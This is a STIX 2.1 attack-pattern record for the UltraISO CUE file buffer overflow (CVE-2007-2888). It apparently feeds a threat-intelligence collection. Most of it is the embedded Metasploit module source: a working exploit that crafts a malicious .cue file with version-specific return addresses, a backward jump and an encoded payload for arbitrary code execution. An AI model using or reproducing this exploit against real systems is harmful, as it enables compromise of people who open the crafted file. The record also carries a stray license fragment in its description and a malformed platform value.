{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--36a9b3d3-27aa-4139-b21a-2b3090021745",
    "created": "2024-08-14T16:36:26.398705Z",
    "modified": "2024-08-14T16:36:26.398709Z",
    "name": "UltraISO CUE File Parsing Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in EZB Systems, Inc's UltraISO. When processing .CUE files, data is read from file into a fixed-size stack buffer. Since no bounds checking is done, a buffer overflow can occur. Attackers can execute arbitrary code by convincing their victim to open an CUE file.  NOTE: A file with the same base name, but the extension of \"bin\" must also exist. Opening either file will trigger the vulnerability, but the files must both exist.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/ultraiso_cue.rb",
            "external_id": "ultraiso_cue.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-2888"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'UltraISO CUE File Parsing Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in EZB Systems, Inc's\n        UltraISO. When processing .CUE files, data is read from file into a\n        fixed-size stack buffer. Since no bounds checking is done, a buffer overflow\n        can occur. Attackers can execute arbitrary code by convincing their victim\n        to open an CUE file.\n\n        NOTE: A file with the same base name, but the extension of \"bin\" must also\n        exist. Opening either file will trigger the vulnerability, but the files must\n        both exist.\n      },\n      'License'        => MSF_LICENSE,\n      'Author' \t     =>\n        [\n          'n00b',  # original discovery\n          'jduck' # metasploit version\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-2888' ],\n          [ 'OSVDB', '36570' ],\n          [ 'BID', '24140' ],\n          [ 'EDB', '3978' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'BadChars'    => \"\\x00\\x0a\\x0d\\x22\",\n          'DisableNops' => true,\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # BOF @ 0x005e1f8b\n\n          # The EXE base addr contains a bad char (nul). This prevents us from\n          # writing data after the return address.  NOTE: An SEH exploit was\n          # originally created for this vuln, but was tossed in favor of using\n          # the return address method instead. This is due to the offset being\n          # stable across different open methods.\n\n          [ 'Windows - UltraISO v8.6.2.2011 portable',\n            {\n              'Offset' => 1100,\n              'JmpOff' => 0x30,   # offset from the end to our jmp\n              'Ret' => 0x00594740 # add esp, 0x64 / p/p/p/r in unpacked UltraISO.exe\n            }\n          ],\n          [ 'Windows - UltraISO v8.6.0.1936',\n            {\n              'Offset' => 1100,\n              'JmpOff' => 0x30,   # offset from the end to our jmp\n              'Ret' => 0x0059170c # add esp, 0x64 / p/p/p/r in unpacked UltraISO.exe\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2007-05-24',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.cue']),\n      ])\n  end\n\n  def exploit\n\n    off = target['Offset']\n    jmpoff = target['JmpOff']\n\n    sploit = \"\\\"\"\n    sploit << payload.encoded\n    sploit << rand_text_alphanumeric(off - sploit.length)\n\n    # Smashed return address..\n    sploit[off, 4] = [target.ret].pack('V')\n\n    # We utilize a single instruction near the end of the buffer space to\n    # jump back to the beginning of the buffer..\n    distance = off - jmpoff\n    distance -= 1 # dont execute the quote character!\n    jmp = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + distance.to_s).encode_string\n    sploit[off - jmpoff, jmp.length] = jmp\n\n    sploit << \".BIN\\\"\"\n\n    cue_data = \"FILE \"\n    cue_data << sploit\n    cue_data << \" BINARY\\r\\n\"\n    cue_data << \" TRACK 01 MODE1/2352\\r\\n\"\n    cue_data << \"   INDEX 01 00:00:00\\r\\n\"\n\n    print_status(\"Creating '#{datastore['FILENAME']}' using target '#{target.name}' ...\")\n    file_create(cue_data)\n\n    # This extends the current class, and changes the file_format_name.\n    # This allows us to use the file_create(data) to store the created\n    # file in the correct directory.\n\n    class << self\n      def file_format_filename\n        datastore['FILENAME'].gsub(/\\.cue$/, '.bin')\n      end\n    end\n\n    file_create('')\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-05-24",
    "x_mitre_platforms": [
        "win'"
    ]
}